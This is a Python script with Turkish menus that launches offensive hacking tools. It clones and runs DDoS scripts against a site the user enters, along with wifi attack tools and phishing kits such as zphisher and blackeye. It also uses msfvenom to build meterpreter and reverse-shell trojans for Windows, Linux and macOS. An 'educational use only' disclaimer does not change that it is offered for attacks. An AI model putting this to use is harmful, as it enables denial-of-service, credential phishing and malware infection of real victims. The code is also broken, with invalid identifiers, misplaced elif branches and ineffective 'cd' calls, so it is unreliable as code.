#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet ALL IN ONE")
print("""

1) DDOSlar
2) wifi attackleri
3) phisher attackler
4) net scanleri
5) firewall sorguluyucu
6) trojan
7) fake wap downloader and setupper
8) root kit kontrolcusu
*not bunlar için biriseyler indirmeniz gerekli olabilir
LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY OR DAMAGE 
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.


""")
 
islemno = raw_input("islem numarasi girin: ")
if(islemno=="1"):
         os.system("clear")
           print("""
        1) saphyra
        2) sadboy
        *dos
        3) golden eye          
                    
           """)
        islemno.2 = raw_input("islem numarasi girin: ")
        elif(islemno.2=="1"):
        os.system("git clone https://github.com/H1R0GH057/Anonymous.git")
        os.system("clear")
        sitead = raw_input("site linki: ")
        os.system("cd Anonymous")
        os.system("python saphyra.py "+ sitead)
        elif(islemno.2=="2"):
        os.system("git clone https://github.com/H1R0GH057/Anonymous.git")
        os.system("clear")
        sitead = raw_input("site linki: ")   
        os.system("cd Anonymous")
        os.system("python sadboy.py"+ sitead)
        elif(islemno.2=="3"):
        os.system("git clone https://github.com/H1R0GH057/Anonymous.git")
        os.system("clear")
        sitead = raw_input("site linki: ")
        os.system("cd Anonymous")
        os.system("python goldeneye.py "+ sitead)
elif(islemno=="2"):
          os.system("clear")
          print("""
          
          1) wifite
          2) wifite2
          3) wireshark
          

          """)
        islemno.3 = raw_input("islem numarasi girin: ")
        elif(islemno.3=="1"):
        os.system("sudo wifite")
        elif(islemno.3=="2"):
        os.system("git clone https://github.com/derv82/wifite2.git")
        os.system("clear")
        os.system("cd wifite2")
        os.system("sudo ./Wifite.py")
        elif(islemno.3=="3"):
        os.system("sudo wireshark")
elif(islemno=="3"):
        os.system("clear")
        print("""
        
        1) blackeye *ngrok gerekli
        2) zphisher
        3) socialphish
        
        
        
        
        """)
      islemno.4 = raw_input("islem numarasi girin")
         elif(islemno.4=="1"):
         os.system("git clone https://github.com/An0nUD4Y/blackeye.git")
         os.system("clear")
         os.system("cd blackeye") 
         print("bir test yapin komut bash blackeye.sh")
         os.system("bash blackeye.sh")
       ngrokno = raw_input("ngrok authtoke:")
         os.system(ngrokno)
         os.system("bash blackeye.sh")
      elif(islemno.4=="2"):
         os.system("git clone https://github.com/htr-tech/zphisher.git")
         os.system("clear")
         os.system("cd zphisher")
         os.system("bash zphisher.sh")
      elif(islemno.4=="3"):
         os.system("git clone https://github.com/xHak9x/SocialPhish.git")
         os.system("clear")
         os.system("cd SocialPhish")
         os.system("chmod +x socialphish.sh")
         os.system("clear")
         os.system("./socialphish.sh")
elif(islemno=="4"):
         os.system("clear")
         print("""
         
        1) nmapez cogu nmap komutu orda
        2) netdiscover
        
         """)
       islemno.5 = raw_input("islem no girin: ")
       elif(islemno.5=="1"):
                 os.system("git clone https://github.com/themadbo1/nmapez")
                 os.system("clear")
                 os.system("cd nmapez")
                 os.system("python nmapez.py")
      elif(islemno.5=="2"):
                print("""

                1) wlan0
                2) eth0 
                """)          
                interface = raw_input("islem no girin :")
                elif(interface=="1"):
                          os.system("sudo netdiscover -i wlan0 -r 192.168.0.0/16")  
                elif(interface=="2"):
                           os.system("sudo netdiscover -i eth0 -r 10.0.2.0/16")                   
elif(islemno=="5"):
         os.system("clear")
         site = raw_input("please write the adress of the site: ")
         os.system("wafw00f " + site)
elif(islemno=="6"):
         os.system("git clone https://github.com/rapid7/metasploit-framework.git")
         os.system("clear")
         print("""
         
         1) trojan for windows
         2) trojan for linux
         3) trojan for mac
         
         """)
         islemno.6 = raw_input("islem no girin: ")   
                 elif(islemno.6=="1"):
                  os.system("cd Msfvenom")
                  os.system("sudo ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f exe")
                  elif(islemno.6=="2"):
                  os.system("cd Msfvenom")
                  os.system("sudo ./msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf > shell.elf")       
                  elif(islemno.6=="3"):
                  os.system("cd Msfvenom")
                  os.system("sudo ./msfvenom -p osx/x86/shell_reverse_tcp -f macho > shell.macho")
elif(islemno=="7"):
          os.system("git clone https://github.com/wifiphisher/wifiphisher.git")
          os.system("clear")
          os.system("cd wifiphisher")
          os.system("sudo python setup.py install")
elif(islemno=="8"):
        os.system("chkrootkit") 